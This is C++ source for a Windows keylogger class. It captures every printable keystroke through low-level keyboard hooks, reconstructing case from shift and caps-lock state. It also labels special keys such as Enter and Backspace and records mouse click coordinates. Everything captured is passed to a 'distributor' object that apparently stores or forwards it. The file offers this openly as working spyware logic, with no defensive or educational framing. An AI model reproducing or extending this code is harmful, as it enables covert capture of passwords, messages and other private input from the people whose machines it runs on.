#include "Keylogger.h"

Keylogger::Keylogger(void)
{	
	_keys[VK_RETURN] = std::bind(&Keylogger::key_Enter, this, std::placeholders::_1);
	_keys[VK_BACK] = std::bind(&Keylogger::key_Backspace, this, std::placeholders::_1);
	_keys[VK_DELETE] = std::bind(&Keylogger::key_Delete, this, std::placeholders::_1);
	_keys[VK_SHIFT] = std::bind(&Keylogger::key_Shift, this, std::placeholders::_1);
	_keys[VK_LSHIFT] = std::bind(&Keylogger::key_LShift, this, std::placeholders::_1);
	_keys[VK_RSHIFT] = std::bind(&Keylogger::key_RShift, this, std::placeholders::_1);
	_keys[VK_CAPITAL] = std::bind(&Keylogger::key_Maj, this, std::placeholders::_1);
	_keys[VK_LEFT] = std::bind(&Keylogger::key_Left, this, std::placeholders::_1);
	_keys[VK_RIGHT] = std::bind(&Keylogger::key_Right, this, std::placeholders::_1);
	_keys[VK_UP] = std::bind(&Keylogger::key_Up, this, std::placeholders::_1);
	_keys[VK_DOWN] = std::bind(&Keylogger::key_Down, this, std::placeholders::_1);

	_maj = KeyState::KS_RELEASED;
	_shift = KeyState::KS_RELEASED;
}

Keylogger::~Keylogger(void)
{
	
}

void Keylogger::init(void)
{
	try {
		std::string resDir = StaticTools::GetProjectResourceDirectory();
		StaticTools::CreateFolder(resDir);

		//_diffuser.init();
		//DebugLogFile::Log.open(resDir + "\\debug.log");
		//ErrorLogFile::Log.open(resDir + "\\error.log");
	}
	catch (std::runtime_error const& e) {
		(void)e;
		//ErrorLogFile::Log << e.what() << std::endl;
	}
}

void Keylogger::keyPressed(LPKBDLLHOOKSTRUCT key)
{
	std::unique_ptr<AInputType> input(new InputKeyboard);
	WORD wChar = 0;
	unsigned char c = 0;
	BYTE keyboard_state[256];
	int ret = 0;
	std::string data;
	
	GetKeyboardState(keyboard_state);
	ret = ToAscii(key->vkCode, key->scanCode, keyboard_state, &wChar, 0);
	c = (unsigned char)wChar;
	
	if (ret > 0 && std::isprint(c))
	{
		if (_shift == KeyState::KS_PRESSED || _maj == KeyState::KS_PRESSED)
		{
			if (std::isalpha(c) && std::islower(c)) {
					c -= 32;
			}
			else {
				// ...
			}
		}
		data.push_back(c);
		*_distributor << (*input << data);
	}
	else
	{
		if (_keys.find(key->vkCode) != _keys.cend()) {
			data = _keys.at(key->vkCode)(KeyState::KS_PRESSED);
			if (!data.empty()) {
				*_distributor << (*input << data);
			}
		}
	}
}

void Keylogger::keyReleased(LPKBDLLHOOKSTRUCT key)
{
	std::unique_ptr<AInputType> input(new InputKeyboard);
	std::string data;

	if (_keys.find(key->vkCode) != _keys.cend()) {
		data = _keys.at(key->vkCode)(KeyState::KS_RELEASED);
		if (!data.empty()) {
			*_distributor << (*input << data);
		}
	}
}

void Keylogger::mouseClick(LPMSLLHOOKSTRUCT mouse)
{
	std::unique_ptr<AInputType> input(new InputMouse);
	std::string data;

	data = std::to_string(mouse->pt.x) + ", " + std::to_string(mouse->pt.y);
	*_distributor << (*input << data);
}

void Keylogger::setDistributor(std::shared_ptr<IDistributor> distributor)
{
	_distributor = distributor;
}

std::string Keylogger::key_Enter(KeyState v)
{
	if (v == KeyState::KS_PRESSED)
		return ("[ENTER]");
	return ("");
}

std::string Keylogger::key_Backspace(KeyState v)
{
	if (v == KeyState::KS_PRESSED)
		return ("[BACKSPACE]");
	return ("");
}

std::string Keylogger::key_Delete(KeyState v)
{
	if (v == KeyState::KS_PRESSED)
		return ("[DEL]");
	return ("");
}

std::string Keylogger::key_Shift(KeyState v)
{
	_shift = v;
	return ("");
}

std::string Keylogger::key_LShift(KeyState v)
{
	_shift = v;
	return ("");
}

std::string Keylogger::key_RShift(KeyState v)
{
	_shift = v;
	return ("");
}

std::string Keylogger::key_Maj(KeyState v)
{
	if (_maj == KeyState::KS_RELEASED && v == KeyState::KS_PRESSED)
		_maj = v;
	else if (_maj == KeyState::KS_PRESSED && v == KeyState::KS_PRESSED)
		_maj = KeyState::KS_RELEASED;
	return ("");
}

std::string Keylogger::key_Left(KeyState v)
{
	if (v == KeyState::KS_PRESSED)
		return ("[LEFT]");
	return ("");
}

std::string Keylogger::key_Right(KeyState v)
{
	if (v == KeyState::KS_PRESSED)
		return ("[RIGHT]");
	return ("");
}

std::string Keylogger::key_Up(KeyState v)
{
	if (v == KeyState::KS_PRESSED)
		return ("[UP]");
	return ("");
}

std::string Keylogger::key_Down(KeyState v)
{
	if (v == KeyState::KS_PRESSED)
		return ("[DOWN]");
	return ("");
}
